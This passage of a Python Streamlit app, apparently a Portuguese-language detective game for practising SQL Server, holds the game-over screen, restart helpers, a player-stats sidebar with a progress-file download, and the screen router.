        <div style="color:#999; font-size:1rem; max-width:500px;
                    margin:0 auto 2rem; line-height:1.8;">
            O suspeito desapareceu nas profundezas da dark web.
            Você cometeu erros demais, Detetive <strong style="color:#f5ead0">{st.session_state.player_name}</strong>.
            Revise seus conceitos de SQL Server e tente novamente.
        </div>
    </div>
    """, unsafe_allow_html=True)

    c1, c2, c3 = st.columns([1, 2, 1])
    with c2:
        ca, cb = st.columns(2)
        with ca:
            if st.button("🔄 Tentar Novamente", use_container_width=True, type="primary"):
                _restart_game()
        with cb:
            if st.button("🚪 Sair", use_container_width=True):
                _full_reset()


# ─────────────────────────────────────────────
# UTILS
# ─────────────────────────────────────────────
def _restart_game():
    """Mantém nome e nível, reinicia apenas o estado de jogo."""
    name  = st.session_state.player_name
    level = st.session_state.player_level
    for key in list(st.session_state.keys()):
        del st.session_state[key]
    init_state()
    st.session_state.screen       = "register"
    st.session_state.player_name  = name
    st.rerun()

def _full_reset():
    for key in list(st.session_state.keys()):
        del st.session_state[key]
    st.rerun()


# ─────────────────────────────────────────────
# SIDEBAR — Perfil do jogador
# ─────────────────────────────────────────────
def render_sidebar():
    if st.session_state.player_name:
        with st.sidebar:
            rec = load_player(st.session_state.player_name)
            if rec:
                badge_cls = level_css_class()
                lbl = LEVEL_LABELS.get(st.session_state.player_level, "")
                st.markdown(f"""
                <div style="text-align:center; padding:0.5rem 0 1rem;">
                    <div style="font-size:3rem;">🕵️</div>
                    <div style="font-family:'Playfair Display',serif; color:#f5ead0;
                                font-size:1.1rem;">{rec['name']}</div>
                    <div class="level-badge {badge_cls}" style="margin-top:0.3rem;">{lbl}</div>
                </div>
                """, unsafe_allow_html=True)
                st.divider()
                st.metric("🏆 Melhor", rec.get("best_score", 0))
                st.metric("🎮 Partidas", rec.get("games_played", 0))
                st.metric("✅ Vitórias", rec.get("games_won", 0))
                st.divider()

                with st.expander("📄 Arquivo completo"):
                    st.code(format_player_card(rec), language=None)

                with st.expander("📂 Arquivo de Progresso (.txt)"):
                    try:
                        with open("players_progress.txt", "r", encoding="utf-8") as f:
                            content = f.read()
                        st.text_area("players_progress.txt", value=content, height=200,
                                     label_visibility="collapsed")
                        st.download_button(
                            "⬇️ Baixar players_progress.txt",
                            data=content,
                            file_name="players_progress.txt",
                            mime="text/plain",
                            use_container_width=True,
                        )
                    except FileNotFoundError:
                        st.info("Nenhuma partida registrada ainda.")


# ─────────────────────────────────────────────
# ROUTER
# ─────────────────────────────────────────────
render_sidebar()

screen = st.session_state.screen
if   screen == "intro":    render_intro()
elif screen == "register": render_register()
elif screen == "game":     render_game()
elif screen == "win":      render_win()
elif screen == "lose":     render_lose()
